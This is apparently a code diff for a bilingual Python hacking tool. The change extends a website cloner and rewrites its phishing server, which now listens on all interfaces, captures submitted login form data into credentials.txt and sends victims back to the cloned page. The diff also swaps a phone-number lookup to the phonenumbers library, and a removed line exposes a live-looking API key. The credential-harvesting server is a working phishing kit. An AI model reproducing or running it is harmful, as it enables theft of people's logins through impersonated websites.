@@ -3,12 +3,14 @@ import subprocess
 import http.server
 import socketserver
 import threading
-import numlookupapi
 import time
 import webbrowser
 import requests
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
+import phonenumbers
+from phonenumbers import geocoder, carrier
+import urllib.parse
 
 # Função para limpar a tela do console
 def clear_console():
@@ -231,8 +233,6 @@ def phishing_menu(language):
         else:
             handle_invalid_option(language)
 
-
-# Função para as páginas de logins falsas
 # Função para as páginas de logins falsas
 def fake_login_pages(language):
     clear_console()
@@ -265,154 +265,138 @@ def clone_website(url, server_choice, language):
 
             # Salvando o HTML e CSS
             html_content = soup.prettify()
-            css_content = ''  # Lógica para extrair o CSS da página
+            css_content = ""
+            for css in soup.find_all('link', rel='stylesheet'):
+                css_url = css['href']
+                css_response = requests.get(css_url)
+                css_content += css_response.text
 
-            # Salvar HTML e CSS em arquivos locais
             with open('index.html', 'w', encoding='utf-8') as html_file:
                 html_file.write(html_content)
-
-            with open('styles.css', 'w', encoding='utf-8') as css_file:
+            with open('style.css', 'w', encoding='utf-8') as css_file:
                 css_file.write(css_content)
 
-            print("HTML and CSS downloaded successfully!")
-
-            # Continuar com a execução no servidor selecionado (apenas localhost implementado)
             if server_choice == '1':
-                run_local_server(url, language)
-
+                run_localhost_server(language)
+            else:
+                if language == '1':
+                    print("Server choice not implemented yet.")
+                else:
+                    print("Escolha de servidor ainda não implementada.")
         else:
-            print(f"Failed to clone {url}. Status code: {response.status_code}")
+            if language == '1':
+                print(f"Failed to clone {url}. HTTP Status Code: {response.status_code}")
+            else:
+                print(f"Falha ao clonar {url}. Código de Status HTTP: {response.status_code}")
 
     except Exception as e:
-        print(f"Error cloning website: {e}")
+        if language == '1':
+            print(f"Error cloning website: {e}")
+        else:
+            print(f"Erro ao clonar o site: {e}")
 
-# Função para executar o servidor local para phishing
-def run_local_server(target_url, language):
+    input("Press Enter to continue...")
+
+# Função para rodar um servidor HTTP local para phishing
+def run_localhost_server(language):
     clear_console()
     if language == '1':
-        print("Running phishing site on localhost...")
+        print("Executing phishing site on localhost...")
+        print("Server running at http://localhost:8080")
     else:
         print("Executando site de phishing em localhost...")
+        print("Servidor rodando em http://localhost:8080")
 
-    # Configurar o servidor HTTP local para servir os arquivos clonados
-    class PhishingServer(http.server.BaseHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, **kwargs)
-
-        def do_GET(self):
-            # Servir arquivos index.html e styles.css
-            try:
-                if self.path == '/':
-                    self.path = '/index.html'
-                elif self.path == '/styles.css':
-                    pass  # Lógica para servir o arquivo CSS
-
-                # Abrir e enviar o arquivo solicitado
-                with open(os.path.join('.', self.path[1:]), 'rb') as file:
-                    self.send_response(200)
-                    if self.path.endswith('.html'):
-                        self.send_header('Content-type', 'text/html')
-                    elif self.path.endswith('.css'):
-                        self.send_header('Content-type', 'text/css')
-                    self.end_headers()
-                    self.wfile.write(file.read())
-
-            except FileNotFoundError:
-                self.send_error(404, 'File Not Found: %s' % self.path)
-
+    # Classe personalizada para lidar com requisições HTTP POST
+    class PhishingServer(http.server.SimpleHTTPRequestHandler):
         def do_POST(self):
-            # Capturar dados do formulário POST
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length).decode('utf-8')
-            username = post_data.split('&')[0].split('=')[1]
-            password = post_data.split('&')[1].split('=')[1]
+            post_params = urllib.parse.parse_qs(post_data)
 
-            # Exibir credenciais no console
-            if language == '1':
-                print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
-                print(f"Username: {username}")
-                print(f"Password: {password}")
-            else:
-                print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
-                print(f"Nome de Usuário: {username}")
-                print(f"Senha: {password}")
+            with open('credentials.txt', 'a') as cred_file:
+                cred_file.write(str(post_params) + '\n')
 
-            # Redirecionar para a URL digitada após capturar as credenciais
-            self.send_response(302)
-            self.send_header('Location', target_url)
+            # Redireciona para a página falsa novamente
+            self.send_response(301)
+            self.send_header('Location', '/')
             self.end_headers()
 
+    # Inicia o servidor HTTP em uma nova thread
+    server = socketserver.TCPServer(('0.0.0.0', 8080), PhishingServer)
+    server_thread = threading.Thread(target=server.serve_forever)
+    server_thread.daemon = True
+    server_thread.start()
+
+    # Abre o navegador para mostrar o site de phishing
+    webbrowser.open('http://localhost:8080')
+
+    # Mantém o servidor rodando até que o usuário decida parar
     try:
-        # Iniciar o servidor em uma thread separada
-        server = socketserver.TCPServer(('localhost', 8080), PhishingServer)
-        server_thread = threading.Thread(target=server.serve_forever)
-        server_thread.daemon = True
-        server_thread.start()
-
-        if language == '1':
-            print("Server running at http://localhost:8080")
-        else:
-            print("Servidor rodando em http://localhost:8080")
-
-        input("\nPress Enter to stop the phishing server and continue...")
-
-        # Após capturar as credenciais, parar o servidor
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
         server.shutdown()
-        server.server_close()
+        if language == '1':
+            print("Phishing server stopped.")
+        else:
+            print("Servidor de phishing parado.")
 
-        # Limpar os arquivos HTML e CSS
-        clean_up_files()
-
-    except Exception as e:
-        print(f"Error running local server: {e}")
-
-# Função para limpar os arquivos HTML e CSS
-def clean_up_files():
-    try:
-        os.remove('index.html')
-        os.remove('styles.css')
-    except Exception as e:
-        print(f"Error cleaning up files: {e}")
-
-# Função para informações de número de telefone
+# Função para obter informações de número de telefone
 def phone_number_info(language):
     clear_console()
     if language == '1':
-        print("Phone Number Information")
-        print("Enter a phone number to obtain information (Country Code + Carrier area code):")
+        print("Enter the phone number (with country code):")
     else:
-        print("Informações de Número de Telefone")
-        print("Digite um número de telefone para obter informações(Código do País + DDD da operadora):")
+        print("Digite o número de telefone (com código do país):")
 
-    phone_number = input("Phone number: ")
+    phone_number = input("Phone Number: ")
 
-    # Consulta à API numlookupapi para obter informações detalhadas
     try:
-        client = numlookupapi.Client('num_live_nPxUn5CQCi43HYw85qiaohr9FvykkoqCa1x8QkEy')  # Substitua 'YOUR-API-KEY' pelo seu API key
-        result = client.validate(phone_number)
-        
-        # Formatando a resposta no estilo desejado
-        print("\nInformation for phone number", phone_number)
-        print("Valid:", result.get("valid", False))
-        print("Number:", result.get("number", ""))
-        print("Local Format:", result.get("local_format", ""))
-        print("International Format:", result.get("international_format", ""))
-        print("Country Prefix:", result.get("country_prefix", ""))
-        print("Country Code:", result.get("country_code", ""))
-        print("Country Name:", result.get("country_name", ""))
-        print("Location:", result.get("location", ""))
-        print("Carrier:", result.get("carrier", ""))
-        print("Line Type:", result.get("line_type", ""))
+        parsed_number = phonenumbers.parse(phone_number)
+        if phonenumbers.is_valid_number(parsed_number):
+            local_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL)
+            international_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
+            country_prefix = parsed_number.country_code
+            country_code = geocoder.country_name_for_number(parsed_number, 'en')
+            location = geocoder.description_for_number(parsed_number, 'en')
+            carrier_name = carrier.name_for_number(parsed_number, 'en')
+            line_type = phonenumbers.number_type(parsed_number)
+
+            phone_info = {
+                "valid": True,
+                "number": phone_number,
+                "local_format": local_number,
+                "international_format": international_number,
+                "country_prefix": country_prefix,
+                "country_code": country_code,
+                "country_name": country_code,
+                "location": location,
+                "carrier": carrier_name,
+                "line_type": line_type
+            }
+        else:
+            phone_info = {"valid": False}
+
+        if language == '1':
+            print(Fore.GREEN + "Phone Number Information:")
+        else:
+            print(Fore.GREEN + "Informações do Número de Telefone:")
+
+        for key, value in phone_info.items():
+            print(Fore.YELLOW + f"{key}: {value}")
 
     except Exception as e:
-        print(Fore.RED + f"Error fetching phone number information: {e}")
+        if language == '1':
+            print(Fore.RED + f"Error: {e}")
+        else:
+            print(Fore.RED + f"Erro: {e}")
 
-    input("\nPress Enter to continue...")
+    input("Press Enter to continue...")
 
-# Inicialização do programa
 if __name__ == "__main__":
-    init(autoreset=True)  # Inicialização do colorama
-    language = input("Choose language / Escolha o idioma:\n1. English\n2. Português\n\nChoice / Escolha: ")
+    init(autoreset=True)
+    language = input("Choose your language / Escolha seu idioma (1-English, 2-Português): ")
     welcome_message(language)
     loading_screen()
     main_menu(language)
